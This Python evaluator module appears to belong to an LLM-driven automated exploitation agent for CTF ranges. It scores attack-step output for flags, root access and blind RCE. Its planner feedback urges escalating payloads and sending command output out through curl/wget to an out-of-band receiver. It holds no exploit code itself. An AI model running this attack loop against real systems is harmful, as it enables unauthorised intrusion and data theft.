        cur = behavioral_signals.get("backend_parser_state_changed", 0.0)
        behavioral_signals["backend_parser_state_changed"] = max(cur, 0.15)

    # → process_crash_or_worker_restart: connection refused AFTER successful connection
    has_conn_refused = bool(re.search(r'connection\s+refused|connection\s+reset|'
                                       r'broken\s+pipe|remote\s+end\s+closed',
                                       all_stdouts, re.IGNORECASE))
    has_prior_success = bool(re.search(r'\[HTTP\]\s*2\d{2}', all_stdouts))
    if has_conn_refused and has_prior_success:
        behavioral_signals["process_crash_or_worker_restart"] = 0.25

    # → outbound_controlled_channel_established: DNS/HTTP interaction from target
    if re.search(r'(?:dns|nslookup|resolve|curl|wget|fetch)\s+(?:http|https)://|'
                 r'outbound.*(?:connection|request|callback)|'
                 r'OOBReceiver|oob\.(?:url|result|hit)',
                 all_stdouts, re.IGNORECASE):
        behavioral_signals["outbound_controlled_channel_established"] = 0.55

    # → filesystem_side_effect: file listing / content fragments
    if re.search(r'(?:total\s+\d+|drwx|rwx|ls\s+-|find\s+/|cat\s+/|head\s+/|tail\s+/)',
                 all_stdouts, re.IGNORECASE):
        behavioral_signals["filesystem_side_effect"] = 0.60

    # → template_evaluation_artifact: expression computation from template engine
    if re.search(r'\{\{.*\}\}.*\d+|expression\s+(?:evaluated|computed|result)',
                 all_stdouts, re.IGNORECASE):
        behavioral_signals["template_evaluation_artifact"] = 0.38

    # ── Tiered scoring with non-linear accumulation ──
    def _level_score(weights: dict[str, float]) -> float:
        """1 - ∏(1 - w_i) for all signals matching this level's weight table."""
        product = 1.0
        for signal_id, w in weights.items():
            if signal_id in primitives:
                product *= (1.0 - w)
            elif signal_id in behavioral_signals:
                product *= (1.0 - behavioral_signals[signal_id])
        if product == 1.0:
            return 0.0
        return 1.0 - product

    l1 = _level_score(_LEVEL_1_WEIGHTS)
    l2 = _level_score(_LEVEL_2_WEIGHTS)
    l3 = _level_score(_LEVEL_3_WEIGHTS)
    l4 = _level_score(_LEVEL_4_WEIGHTS) if flag_found else 0.0

    # Flag found → force 1.0
    if flag_found:
        progress = 1.0
    else:
        # Cumulative stacking: L1 + L2 + L3 — each layer adds on top of previous
        # but capped so no level can overshoot into the next tier's range
        progress = l1 * 0.25 + l2 * 0.35 + l3 * 0.40 + l4
        progress = min(progress, 0.99)  # cap at 0.99 without objective

    # State transition probability: likelihood of reaching next state machine stage
    # Based on the highest evidence level detected
    if flag_found:
        stp = 1.0
    elif l3 > 0:
        stp = 0.7 + l3 * 0.3
    elif l2 > 0:
        stp = 0.4 + l2 * 0.4
    elif l1 > 0:
        stp = 0.2 + l1 * 0.3
    else:
        stp = 0.05

    # Suggested next action based on what we have
    if flag_found:
        suggested = "DONE"
    elif l3 > 0.3:
        suggested = "DEEP_DIVE"   # close to breakthrough, keep pushing
    elif l2 > 0.1:
        suggested = "EVOLVE"      # primitive established, mutate payload
    elif l1 > 0.05:
        suggested = "DEEP_DIVE"   # surface signal — dig deeper on this path
    else:
        suggested = "EVOLVE"      # no signal yet, but don't say PIVOT

    # Exploit momentum: is there ANY forward movement from side effects?
    has_momentum = (l1 + l2 + l3) > 0.05

    return {
        "progress_score": round(progress, 3),
        "primitive_confidence": prim_conf,
        "exploit_momentum": has_momentum,
        "state_transition_probability": round(stp, 3),
        "suggested_next_action": suggested,
        "_level_breakdown": {"L1_surface": round(l1, 3), "L2_primitive": round(l2, 3),
                             "L3_capability": round(l3, 3), "L4_objective": 1.0 if flag_found else 0.0},
        "_behavioral_signals": behavioral_signals,
    }


# ────────────────────────────────────────────────────────────────
# Mock 评估（无 LLM 时）
# ────────────────────────────────────────────────────────────────

def _mock_evaluate(confirmed: dict[str, Any], plan: dict[str, Any], exec_out: dict[str, Any]) -> dict[str, Any]:
    executed = exec_out.get("executed")
    if not executed:
        return {
            "version": 1,
            "repro_success": False,
            "confidence": 0.2,
            "evidence_level": "F",
            "hard_evidence_found": "NONE",
            "error_fingerprint": "AllStdoutEmpty",
            "current_exploit_state": "init",
            "milestones_achieved": ["init: 计划未执行，验证失败或被安全层阻止"],
            "state_transition_blocker": "计划未被执行（executed=False），验证阶段失败或安全策略阻止",
            "next_required_action": "检查 validator 报错，确保步骤结构合法且符合 sandbox_policy.yaml 规则",
            "what_worked": "无步骤执行",
            "what_failed": "计划未被执行，验证阶段失败或计划被安全层阻止",
            "raw_evidence": "executed=False — 计划未执行",
            "hypothesis": "验证失败或安全层阻止",
            "next_direction": "检查 validator 报错，确保步骤结构合法",
            "analysis": {
                "what_happened": "计划未被执行，验证阶段失败或计划被安全层阻止。",
                "vs_expectation": "预期执行攻击步骤，实际未执行任何步骤。",
                "guidance": "检查 validator 报错，确保步骤结构合法，type 字段为 python 或 shell，command 无语法错误。",
            },
            "summary": "[FAILED] 未执行：验证失败或计划被阻止。",
            "feedback_for_planner": "根据验证错误修订计划，保证 step 结构合法。",
            "should_continue": True,
            "suggest_abort": False,
            "is_milestone": False,
            "memory_patch": {},
        }

    results = exec_out.get("step_results") or []
    all_stdouts = " ".join((r.get("result") or {}).get("stdout", "") for r in results)
    # 同时扫描 chain_output._stdout（Executor 注入的上下文 stdout）
    chain_stdouts = " ".join(
        (r.get("chain_output") or {}).get("_stdout", "") for r in results
    )
    all_stdouts = f"{all_stdouts} {chain_stdouts}"
    flag = _detect_flag(all_stdouts)
    signal = _detect_success_signal(all_stdouts) if not flag else ""
    all_ok = all((r.get("result") or {}).get("ok") for r in results)
    blind_rce = _detect_blind_rce(results) if not flag else False

    _STATIC_HYPOTHESIS_UNKNOWN = "证据不足，无法推断"

    if flag:
        success, confidence, evidence_level = True, 0.95, "S"
        hard_evidence = f"Flag detected: {flag}"
        what_happened = f"S级铁证：检测到 flag — {flag}"
        error_fingerprint = "NoError"
        current_exploit_state = "oob_received" if "OOB" in all_stdouts else "gadget_triggered"
        milestones = [f"gadget_triggered: S级铁证 — flag {flag}"]
        transition_blocker = "N/A — 已到达最终状态"
        next_action = "任务完成，停止迭代"
        what_worked_str = f"step 中包含 flag 检测步骤，成功捕获 flag: {flag}"
        what_failed_str = "无失败步骤"
        raw_evidence_str = f"Flag in stdout: {flag}"
        hypothesis_str = "攻击链完整，flag 已获取"
        next_direction_str = "任务已完成，停止迭代"
    elif blind_rce:
        success, confidence, evidence_level = False, 0.5, "F"
        hard_evidence = "NONE"
        what_happened = "步骤退出码为 0（ok=True）但 stdout 全部为空，疑似 Blind RCE：命令已执行但无回显。无任何物理铁证。"
        error_fingerprint = "AllStdoutEmpty"
        current_exploit_state = "payload_injected"
        milestones = ["payload_injected: 命令已执行（exit_code=0）但无回显，疑似 Blind RCE"]
        transition_blocker = "所有步骤 stdout 为空，无法确认 gadget 是否触发。需 OOB 带外回调验证"
        next_action = "切换到 OOBReceiver(port=8765) 带外数据提取，将命令输出通过 curl/wget 发送到 oob.url"
        what_worked_str = "步骤 exit_code=0 但无任何输出回显"
        what_failed_str = "所有步骤 stdout 为空，无法确认攻击结果"
        raw_evidence_str = "所有步骤 stdout 为空 — Executor 输出捕获可能存在问题或命令为 Blind RCE"
        hypothesis_str = "命令已执行但输出未回显（Blind RCE），需要 OOB 带外回调提取数据"
        next_direction_str = "切换到 OOBReceiver 带外数据提取模式"
    elif signal:
        success, confidence, evidence_level = True, 0.7, "A"
        hard_evidence = f"Success signal: {signal[:120]}"
        what_happened = f"A级证据：检测到攻击成功信号 — {signal[:120]}"
        error_fingerprint = "NoError"
        current_exploit_state = "gadget_triggered"
        milestones = [f"gadget_triggered: A级证据 — {signal[:120]}"]
        transition_blocker = "已获得 A 级证据，需升级到 S 级铁证。当前缺少 uid=0、/etc/passwd 或 flag 完整回显"
        next_action = "继续利用已触发的 gadget，执行更高权限命令获取 S 级铁证"
        what_worked_str = f"检测到攻击成功信号: {signal[:120]}"
        what_failed_str = "无明确失败"
        raw_evidence_str = f"stdout 中发现成功信号: {signal[:200]}"
        hypothesis_str = "攻击部分成功，需进一步确认 S 级铁证"
        next_direction_str = "继续获取 S 级铁证（uid=0、/etc/passwd 或 flag）"
    elif not all_stdouts.strip():
        success, confidence, evidence_level = False, 0.1, "F"
        hard_evidence = "NONE"
        what_happened = "所有步骤 stdout 均为空，无任何物理铁证，无法判断攻击结果。"
        error_fingerprint = "AllStdoutEmpty"
        current_exploit_state = "init"
        milestones = ["init: 本轮未取得进展，所有步骤 stdout 为空"]
        transition_blocker = "所有步骤 stdout 为空，无法确认脚本是否正常执行。需排查 Executor/Docker 输出捕获机制"
        next_action = "排查 Executor stdout 捕获机制，检查 Docker 容器日志和脚本包装逻辑"
        what_worked_str = "无步骤产生有效输出"
        what_failed_str = "所有步骤 stdout 为空，Executor 输出捕获可能存在问题"
        raw_evidence_str = "所有步骤 stdout 为空 — 这是严重异常，Executor 输出捕获可能存在问题"
        hypothesis_str = "所有步骤 stdout 为空，Executor 输出捕获可能存在问题。请检查 Docker 容器日志和脚本包装逻辑。"
        next_direction_str = "排查 Executor stdout 捕获机制，确认脚本是否正常执行"
    elif all_ok:
        success, confidence, evidence_level = False, 0.3, "F"
        hard_evidence = "NONE"
        what_happened = "所有步骤退出码为 0，有输出但未检测到任何 S 级或 A 级物理铁证。仅凭 exit_code=0 不足以判定成功。"
        error_fingerprint = "NoError"
        current_exploit_state = "probe_success"
        milestones = ["probe_success: 所有步骤 exit_code=0，确认目标可达且脚本无语法错误"]
        transition_blocker = "脚本执行成功但 payload 未正确触发漏洞。需分析 HTTP 响应体确定 payload 是否被目标接受/处理"
        next_action = "检查 [HTTP] 日志中的响应体内容，调整 payload 参数/格式/端点，尝试触发 S 级证据"
        what_worked_str = "所有步骤 exit_code=0"
        what_failed_str = "虽有 stdout 输出但无 S 级或 A 级物理铁证"
        raw_evidence_str = all_stdouts[:500] if all_stdouts.strip() else "stdout 有内容但无铁证"
        hypothesis_str = "脚本执行成功但 payload 未正确触发漏洞"
        next_direction_str = "调整 payload 参数/格式/端点，尝试触发 S 级证据"
    else:
        success, confidence, evidence_level = False, 0.2, "F"
        hard_evidence = "NONE"
        what_happened = "部分步骤失败，未检测到任何物理铁证。"
        error_fingerprint = "ConnectionRefused"
        current_exploit_state = "init"
        milestones = ["init: 本轮未取得进展，部分步骤失败"]
        transition_blocker = f"部分步骤失败 ({len([r for r in results if not (r.get('result') or {}).get('ok')])}/{len(results)} 步骤失败)，需检查错误类型确定阻塞点"
        next_action = "检查 stderr 中的错误指纹，修复语法/连通性问题后再探测"
        what_worked_str = "无步骤成功"
        what_failed_str = f"部分步骤失败 ({len([r for r in results if not (r.get('result') or {}).get('ok')])}/{len(results)} 步骤失败)"
        raw_evidence_str = all_stdouts[:500] if all_stdouts.strip() else "stdout 无有效内容"
        hypothesis_str = _STATIC_HYPOTHESIS_UNKNOWN
        next_direction_str = "检查目标连通性和脚本语法"

    blind_rce_feedback = _BLIND_RCE_FEEDBACK if blind_rce else (
        "若失败：拆分命令、增加探测步骤；若成功：固化可复用 payload 到技术记忆。"
    )

    # ── Partial primitive detection (even in MOCK mode) ──
    all_payloads = " ".join(
        st.get("command", "") for st in (plan.get("steps") or [])
    )
    mock_primitives = _detect_primitives(all_stdouts, all_payloads, results)

    # ── EPE: semantic progress scoring ──
    epe = _compute_progress_score(all_stdouts, all_payloads, results, mock_primitives, flag, signal)

    # is_milestone: true when we have L3 capability or L2 primitive breakthrough
    has_partial_progress = epe["progress_score"] >= 0.25

    # Momentum-aware feedback: cross-round state carry is now richer
    momentum_feedback = blind_rce_feedback
    if epe["exploit_momentum"] and not blind_rce:
        l1 = epe["_level_breakdown"]["L1_surface"]
        l2 = epe["_level_breakdown"]["L2_primitive"]
        l3 = epe["_level_breakdown"]["L3_capability"]
        if l3 > 0:
            momentum_feedback += f" [MOMENTUM·L3] capability signal detected (score={epe['progress_score']:.2f}). Deepen this path — DO NOT pivot or restart fuzzing."
        elif l2 > 0:
            momentum_feedback += f" [MOMENTUM·L2] exploit primitive activated (score={epe['progress_score']:.2f}). Continue refining payload on this same endpoint."
        elif l1 > 0:
            momentum_feedback += f" [MOMENTUM·L1] surface perturbation confirmed (score={epe['progress_score']:.2f}). Stay on this injection point and escalate payload complexity."

    return {
        "version": 1,
        "repro_success": success,
        "confidence": confidence,
        "evidence_level": evidence_level,
        "hard_evidence_found": hard_evidence,
        "error_fingerprint": error_fingerprint,
        "current_exploit_state": current_exploit_state,
        "milestones_achieved": milestones,
        "state_transition_blocker": transition_blocker,
        "next_required_action": next_action,
        "what_worked": what_worked_str,
        "what_failed": what_failed_str,
        "raw_evidence": raw_evidence_str,
        "hypothesis": hypothesis_str,
        "next_direction": next_direction_str,
        "analysis": {
            "what_happened": what_happened,
            "vs_expectation": "MOCK 模式：基于本地正则检测，未进行语义分析。",
            "guidance": (
                _BLIND_RCE_FEEDBACK if blind_rce
                else "启用 LLM 以获得详细的三段论分析和可操作建议。"
            ),
        },
        "summary": what_happened,
        "feedback_for_planner": momentum_feedback,
        "should_continue": not success or blind_rce,
        "suggest_abort": False,
        "is_milestone": bool(flag or signal) or has_partial_progress,
        "memory_patch": {},
        "detected_primitives": mock_primitives.get("detected_primitives", []),
        "primitive_confidence": mock_primitives.get("primitive_confidence", {}),
        "primitive_evidence": mock_primitives.get("primitive_evidence", {}),
        "exploit_chain_primitive": [],
        # ── EPE fields (backward-compat: additive, existing schema intact) ──
        "progress_score": epe["progress_score"],
        "exploit_momentum": epe["exploit_momentum"],
        "state_transition_probability": epe["state_transition_probability"],
        "suggested_next_action": epe["suggested_next_action"],
        "_epe_levels": epe["_level_breakdown"],
        "_behavioral_signals": epe["_behavioral_signals"],
    }


# ────────────────────────────────────────────────────────────────
# 主入口
# ────────────────────────────────────────────────────────────────

def run_evaluator(
    settings: Settings,
    memory: LayeredMemory,
    confirmed: dict[str, Any],
    plan: dict[str, Any],
    exec_out: dict[str, Any],
    feedback_path: Path,
    llm: DeepSeekClient | None,
    adapter: ChallengeAdapter | None = None,
) -> dict[str, Any]:
    # ── 1. 脏数据清洗（截断 + 去 ANSI）+ expected_outcome 注入
    clean_exec_out = _sanitize_exec_output(exec_out, plan=plan)

    # ── 2. 本地预判定（不依赖 LLM）────────────────────
    all_stdouts = " ".join(
        (r.get("result") or {}).get("stdout", "")
        for r in clean_exec_out.get("step_results") or []
    )
    # 同时扫描 chain_output._stdout（Executor 注入的上下文 stdout）
    chain_stdouts = " ".join(
        (r.get("chain_output") or {}).get("_stdout", "")
        for r in clean_exec_out.get("step_results") or []
    )
    all_stdouts = f"{all_stdouts} {chain_stdouts}"
    all_payloads = " ".join(
        st.get("command", "") for st in (plan.get("steps") or [])
    )
    pre_flag    = _detect_flag(all_stdouts)
    pre_signal  = _detect_success_signal(all_stdouts) if not pre_flag else ""
    pre_blind   = _detect_blind_rce(clean_exec_out.get("step_results") or []) if not pre_flag else False
    pre_primitives = _detect_primitives(all_stdouts, all_payloads, clean_exec_out.get("step_results") or [])

    # ── 3. Mock 模式 ────────────────────────────────
    if settings.mock_llm or llm is None:
        fb = _mock_evaluate(confirmed, plan, clean_exec_out)
        memory.apply_evaluator_patch(fb.get("memory_patch") or {})
        feedback_path.parent.mkdir(parents=True, exist_ok=True)
        feedback_path.write_text(json.dumps(fb, ensure_ascii=False, indent=2), encoding="utf-8")
        return fb

    # ── 4. 构建 Prompt ──────────────────────────────
    system_prompt = EVAL_SYSTEM
    if adapter is not None:
        extra = adapter.eval_extra_rules()
        if extra:
            system_prompt = EVAL_SYSTEM + "\n\n【靶场专项规则】\n" + extra

    # 预检测结果注入（减少 LLM 幻觉）
    pre_detection_note = ""
    if pre_flag:
        pre_detection_note = (
            f"\n\n【⚠️ 本地预检测】已在 stdout 中正则匹配到 flag：{pre_flag}\n"
            f"请确保 repro_success=true，should_continue=false，并在 analysis.what_happened 中引用完整 flag。"
        )
    elif pre_blind:
        pre_detection_note = (
            f"\n\n【⚠️ 本地预检测 — Blind RCE 疑似】有步骤 ok=True 但 stdout 全部为空。\n"
            f"这是 Blind RCE 的典型特征：命令已执行，但输出未回显到 HTTP 响应。\n"
            f"判定规则：confidence 不得超过 0.6，repro_success=false，should_continue=true。\n"
            f"feedback_for_planner 必须包含以下内容：{_BLIND_RCE_FEEDBACK}"
        )
    elif pre_signal:
        pre_detection_note = (
            f"\n\n【⚠️ 本地预检测】检测到强攻击成功信号：{pre_signal[:80]}\n"
            f"请在评估时将此信号纳入 repro_success 判定（应为 true）。"
        )

    user_payload = {
        "confirmed_vuln": confirmed,
        "plan": plan,
        "execution_result": clean_exec_out,
    }
    user_msg = json.dumps(user_payload, ensure_ascii=False) + pre_detection_note

    # ── 5. 调用 LLM ─────────────────────────────────
    fb = llm.complete_json(system_prompt, user_msg)
    fb.setdefault("version", 1)
    # 防 LLM 返回 "analysis": null 导致后续 [] 崩溃
    if not isinstance(fb.get("analysis"), dict):
        fb["analysis"] = {}

    # ── 6. 严谨成功判定覆写（防 LLM 幻觉）─────────────
    if pre_flag and not fb.get("repro_success"):
        # 本地检测到 flag，强制成功
        fb["repro_success"] = True
        fb["should_continue"] = False
        fb.setdefault("analysis", {})
        fb["analysis"]["what_happened"] = (
            fb["analysis"].get("what_happened", "") +
            f"（本地强制覆写：检测到 flag {pre_flag}）"
        )
    elif pre_blind:
        # Blind RCE：强制降级，防止 LLM 虚报高置信度
        fb["repro_success"] = False
        fb["should_continue"] = True
        if fb.get("confidence", 0) >= 0.9:
            fb["confidence"] = 0.5
        fb.setdefault("analysis", {})
        fb["analysis"]["what_happened"] = (
            fb["analysis"].get("what_happened", "")
            + "（本地强制覆写：步骤 ok=True 但 stdout 全部为空，疑似 Blind RCE）"
        )
        # 确保 feedback_for_planner 包含 OOB 战术指引
        existing_fb = fb.get("feedback_for_planner", "")
        if "OOBReceiver" not in existing_fb:
            fb["feedback_for_planner"] = _BLIND_RCE_FEEDBACK + (
                f"\n\n（原 LLM 反馈：{existing_fb}）" if existing_fb else ""
            )
    elif not all_stdouts.strip() and fb.get("repro_success"):
        # 所有 stdout 为空，强制失败
        fb["repro_success"] = False
        fb["should_continue"] = True
        fb.setdefault("analysis", {})
        fb["analysis"]["vs_expectation"] = (
            "所有步骤 stdout 为空，不满足成功判定条件（本地强制覆写）。"
        )

    # ── 7. 确保 analysis 三段论完整 ─────────────────
    fb.setdefault("analysis", {})
    fb["analysis"].setdefault("what_happened",  "（LLM 未填写此字段）")
    fb["analysis"].setdefault("vs_expectation", "（LLM 未填写此字段）")
    fb["analysis"].setdefault("guidance",       "（LLM 未填写此字段）")
    fb.setdefault("is_milestone", False)
    fb.setdefault("evidence_level", "F")
    fb.setdefault("hard_evidence_found", "NONE")

    # ── primitive detection fields ──
    fb.setdefault("detected_primitives", pre_primitives.get("detected_primitives", []))
    fb.setdefault("primitive_confidence", pre_primitives.get("primitive_confidence", {}))
    fb.setdefault("primitive_evidence", pre_primitives.get("primitive_evidence", {}))
    fb.setdefault("exploit_chain_primitive", [])  # Exploit chain in primitive terms

    # ── EPE: compute progress score even when LLM is used ──
    ep = _compute_progress_score(all_stdouts, all_payloads,
                                  clean_exec_out.get("step_results") or [],
                                  pre_primitives, pre_flag, pre_signal)
    fb.setdefault("progress_score", ep["progress_score"])
    fb.setdefault("exploit_momentum", ep["exploit_momentum"])
    fb.setdefault("state_transition_probability", ep["state_transition_probability"])
    fb.setdefault("suggested_next_action", ep["suggested_next_action"])
    fb.setdefault("_epe_levels", ep["_level_breakdown"])
    fb.setdefault("_behavioral_signals", ep["_behavioral_signals"])

    # ── 7.0 新字段兜底：确保 error_fingerprint / state machine 等字段始终存在 ──
    fb.setdefault("error_fingerprint", "AllStdoutEmpty" if not all_stdouts.strip() else "ConnectionRefused")
    fb.setdefault("current_exploit_state", "init")
    fb.setdefault("milestones_achieved", ["init: 本轮未取得进展"])
    fb.setdefault("state_transition_blocker", "证据不足，无法确定阻塞点")
    fb.setdefault("next_required_action", "根据 raw_evidence 中的 HTTP 响应调整 payload 参数")
    fb.setdefault("what_worked", "无步骤产生有效输出")
    fb.setdefault("what_failed", "所有步骤 stdout 为空" if not all_stdouts.strip() else "部分步骤失败")
    fb.setdefault("raw_evidence", (
        "所有步骤 stdout 为空 — Executor 输出捕获可能存在问题"
        if not all_stdouts.strip()
        else all_stdouts[:500]
    ))
    fb.setdefault("hypothesis", "证据不足，无法推断")
    fb.setdefault("next_direction", (
        "排查 Executor stdout 捕获机制"
        if not all_stdouts.strip()
        else "根据 raw_evidence 中的 HTTP 响应调整 payload 参数"
    ))

    # ── 7.0.1 AllStdoutEmpty 时强制覆盖：禁止 unknown_error + 锁定状态机为 init ──
    if not all_stdouts.strip():
        fb["error_fingerprint"] = "AllStdoutEmpty"
        fb["current_exploit_state"] = "init"
        fb["milestones_achieved"] = ["init: 本轮未取得进展，所有步骤 stdout 为空"]
        fb["state_transition_blocker"] = "所有步骤 stdout 为空，无法推进状态。需排查 Executor/Docker 输出捕获机制"
        fb["next_required_action"] = "排查 Executor stdout 捕获机制，检查 Docker 容器日志和脚本包装逻辑"
        fb["hypothesis"] = "所有步骤 stdout 为空，Executor 输出捕获可能存在问题"
        fb["raw_evidence"] = "所有步骤 stdout 为空 — 这是严重异常，请检查：\n" \
            "1. Docker 容器是否正常启动并执行了脚本\n" \
            "2. 脚本包装器（_run_docker）是否正常注入了输出捕获\n" \
            "3. 脚本是否因阻塞/死循环导致超时前无输出"
    elif fb.get("error_fingerprint") == "unknown_error":
        # 有 stdout 但 LLM 返回了 unknown_error → 从 stdout 提取真实错误
        all_text = all_stdouts + " " + " ".join(
            (r.get("result") or {}).get("stderr", "")[:200]
            for r in clean_exec_out.get("step_results") or []
        )
        if "STEP_FAIL:" in all_text:
            fb["error_fingerprint"] = "NameError"
            fb.setdefault("current_exploit_state", "init")
            fb.setdefault("state_transition_blocker", "Python NameError — 变量/方法名不存在。需要反射探测确认 SDK API")
        elif "[HTTP] 4" in all_text:
            fb["error_fingerprint"] = "HTTPError4xx"
            fb.setdefault("current_exploit_state", "init")
            fb.setdefault("state_transition_blocker", "HTTP 4xx 客户端错误 — 请求被目标拒绝。检查字段名/endpoint/认证")
        elif "[HTTP] 5" in all_text:
            fb["error_fingerprint"] = "HTTPError5xx"
            fb.setdefault("current_exploit_state", "init")
        elif "Connection refused" in all_text or "ConnectionError" in all_text:
            fb["error_fingerprint"] = "ConnectionRefused"
            fb.setdefault("current_exploit_state", "init")
            fb.setdefault("state_transition_blocker", "目标连接被拒绝 — 检查 base_url 和网络连通性")
        elif "SyntaxError" in all_text:
            fb["error_fingerprint"] = "SyntaxError"
            fb.setdefault("current_exploit_state", "init")
            fb.setdefault("state_transition_blocker", "Python 语法错误 — 修复脚本语法")
        elif "All fields are required" in all_text:
            fb["error_fingerprint"] = "AllFieldsRequired"
            fb.setdefault("current_exploit_state", "probe_success")
            fb.setdefault("state_transition_blocker", "REST API 'All fields are required!' — 字段名不匹配，需用 email 替代 username")
        fb["raw_evidence"] = all_text[:500]

    # ── 7.1 零信任覆写：LLM 声称成功但无 S 级铁证时强制降级 ──
    if fb.get("repro_success") and not pre_flag:
        evidence = fb.get("hard_evidence_found", "")
        raw_stdout_text = all_stdouts
        # Check for S-level physical evidence
        has_s_evidence = False
        s_patterns = [
            r"uid=\d+\(\w+\)",               # uid=0(root)
            r"root:[x*]:\d+:\d+:",           # /etc/passwd content
            r"/etc/(passwd|shadow)",          # sensitive file refs
            r"flag\{[^}]+\}",                 # flag format
            r"CTF\{[^}]+\}",                  # CTF format
            r"HTB\{[^}]+\}",                  # HTB format
        ]
        for pat in s_patterns:
            if re.search(pat, raw_stdout_text, re.IGNORECASE):
                has_s_evidence = True
                break
        if not has_s_evidence:
            fb["repro_success"] = False
            fb["confidence"] = min(fb.get("confidence", 0.5), 0.5)
            fb["evidence_level"] = "F"
            fb.setdefault("analysis", {})
            fb["analysis"]["what_happened"] = (
                fb["analysis"].get("what_happened", "")
                + "（零信任覆写：LLM 声称成功但 raw_stdout 中无 S 级物理铁证，强制降级为 failed）"
            )
            fb["summary"] = "[FAILED·零信任覆写] LLM 已宣称成功，但 raw_stdout 中缺少 S 级物理铁证（uid=0、/etc/passwd、flag 等），已被系统强制判定为失败。"

    # ── 7.2 LLM 声称失败时强制 [FAILED] 前缀 ──
    if not fb.get("repro_success"):
        existing_summary = fb.get("summary", "")
        if not existing_summary.startswith("[FAILED]"):
            fb["summary"] = "[FAILED] " + existing_summary

    # ── 7.5 history_state 透传：将当前 plan 的 history_state 作为 prior_history_state 传给下一轮 Planner ──
    current_history = plan.get("history_state")
    if current_history and isinstance(current_history, dict):
        fb["prior_history_state"] = current_history

    # ── 8. 写入记忆和文件 ────────────────────────────
    memory.apply_evaluator_patch(fb.get("memory_patch") or {})
    feedback_path.parent.mkdir(parents=True, exist_ok=True)
    feedback_path.write_text(json.dumps(fb, ensure_ascii=False, indent=2), encoding="utf-8")
    return fb
